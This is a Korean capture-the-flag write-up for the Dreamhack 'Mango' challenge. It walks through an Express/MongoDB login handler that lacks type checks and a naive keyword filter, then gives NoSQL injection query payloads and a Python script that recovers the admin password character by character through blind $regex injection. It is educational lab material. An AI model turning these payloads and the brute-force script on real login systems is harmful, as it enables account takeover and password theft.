# 함께 실습 NoSQL Injection

[Mango](https://dreamhack.io/wargame/challenges/90/writeups?id=1871)

1. mango injection  으로 admin의 pw를 알아내는 문제
    
    ![Untitled](%E1%84%92%E1%85%A1%E1%86%B7%E1%84%81%E1%85%A6%20%E1%84%89%E1%85%B5%E1%86%AF%E1%84%89%E1%85%B3%E1%86%B8%20NoSQL%20Injection%20b0f79c91d23945d9a85706c57175a6db/Untitled.png)
    
2. 주요 코드를 살펴보자.

```jsx
const express = require('express');
const app = express();

const mongoose = require('mongoose');
mongoose.connect('mongodb://localhost/main', { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;

// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ['admin', 'dh', 'admi'];

filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}

app.get('/login', function(req, res) {
    if(filter(req.query)){
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query;

    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
});

app.get('/', function(req, res) {
    res.send('/login?uid=guest&upw=guest');
});

app.listen(8000, '0.0.0.0');
```

1. 엔드포인트 /login

 /login 페이지 요청 시 실행되는 코드로, 이용자가 쿼리로 전달한 `uid` 와 `upw` 로 데이터베이스를 검색하고, 찾아낸 이용자의 정보를 반환한다.

 'uid': uid,
 'upw': upw,

코드에서 mongoDB에 쿼리를 전달하는 부분을 살펴보면, 쿼리 변수의 타입을 검사하지 않는다. 이로 인해 NoSQL Injection 공격이 발생할 수 있다. 

```jsx
app.get('/login', function(req, res) {
    if(filter(req.query)){
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query;

    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
});

```

1. filter 함수로 특정 문자열을 필터링 한다. 

일부 문자열을 필터링 하는 함수이다. /login의 GET 핸들러를 살펴보면, 이용자의 요청에 포함된 쿼리를 `filter` 함수로 필터링 한다. 해당 함수는 `admin, dh, admi` 라는 문자열이 있을 때 true를 반환한다. 

```jsx
// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ['admin', 'dh', 'admi'];

filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}
```

1. /login에서는 로그인에 성공했을 때 이용자의 `uid`만 출력합니다. 따라서 Blind NoSQL Injection을 통해 admin의 `upw`를 획득해야 합니다. 그냥 로그인 성공했을 때는 guest(아이디)가 출력된다. 
    
    ![Untitled](%E1%84%92%E1%85%A1%E1%86%B7%E1%84%81%E1%85%A6%20%E1%84%89%E1%85%B5%E1%86%AF%E1%84%89%E1%85%B3%E1%86%B8%20NoSQL%20Injection%20b0f79c91d23945d9a85706c57175a6db/Untitled%201.png)
    
    ```jsx
    http://host1.dreamhack.games:11472/login?uid[$gt]=adm&upw[$ne]=
    // result: guest
    ```
    
    | Name | Description |
    | --- | --- |
    | $eq | 지정된 값과 같은 값을 찾습니다. (equal) |
    | $in | 배열 안의 값들과 일치하는 값을 찾습니다. (in) |
    | $ne | 지정된 값과 같지 않은 값을 찾습니다. (not equal) |
    | $nin | 배열 안의 값들과 일치하지 않는 값을 찾습니다. (not in) |
    
    uid가 `$gt` 의 값이 지정된 것보다 큰 것을 선택한다. 
    
    adm&upw가 지정된 값과 같지 않은 값을 찾는다. → 필터링 적용되어 있어서 upw 구할 수 없음.
    
2. `$regex` 를 사용해 보자.
    
    
    | Name | Description |
    | --- | --- |
    | $expr | 쿼리 언어 내에서 집계 식을 사용할 수 있습니다. |
    | $regex | 지정된 정규식과 일치하는 문서를 선택합니다. |
    | $text | 지정된 텍스트를 검색합니다. |

```jsx
import requests
import string

url = "http://host1.dreamhack.games:11472/login"
s = string.digits + string.ascii_uppercase + string.ascii_lowercase + "{}"

result = ""
for i in range(32):
    for idx, c in enumerate(s):
        payload = "?uid[$gt]=adm&uid[$ne]=guest&uid[$lt]=d&upw[$regex]={" + (
            result+c)
        print(payload)
        res = requests.get(url+payload)

        if res.text.find("admin") != -1:
            result += s[idx]
            print(result)
            break

flag = "DH" + result + "}"

print(flag)
```

1. 위 코드를 실행하여 flag를 얻었다!
    
    ![스크린샷 2022-04-04 오후 4.20.58.png](%E1%84%92%E1%85%A1%E1%86%B7%E1%84%81%E1%85%A6%20%E1%84%89%E1%85%B5%E1%86%AF%E1%84%89%E1%85%B3%E1%86%B8%20NoSQL%20Injection%20b0f79c91d23945d9a85706c57175a6db/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2022-04-04_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_4.20.58.png)
    
    참고
    
    [Mango](https://useegod.com/2021/02/16/mango(dream)/)